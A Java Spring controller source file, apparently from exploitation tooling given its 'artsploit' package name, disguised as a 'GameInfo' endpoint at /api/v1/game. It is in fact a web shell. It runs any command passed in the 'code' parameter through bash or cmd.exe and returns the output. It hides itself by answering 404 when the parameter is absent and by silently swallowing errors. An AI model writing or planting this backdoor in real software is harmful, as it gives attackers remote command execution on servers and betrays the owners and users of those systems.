package artsploit;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;

@Controller
public class GameInfo {
    public GameInfo() {
    }
    @RequestMapping(value = "/api/v1/game")
    public void exec(HttpServletRequest request, HttpServletResponse response) throws IOException {
        try {
            String cmd = request.getParameter("code");
            if (cmd != null) {
                Process process;
                if (System.getProperty("os.name").toLowerCase().contains("win")) {
                    process = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", cmd});
                } else {
                    process = Runtime.getRuntime().exec(new String[]{"bash", "-c", cmd});
                }

                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();

                String line;
                while((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '\n');
                }

                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
            } else {
                response.sendError(404);
            }
        } catch (Exception var8) {
        }

    }
}
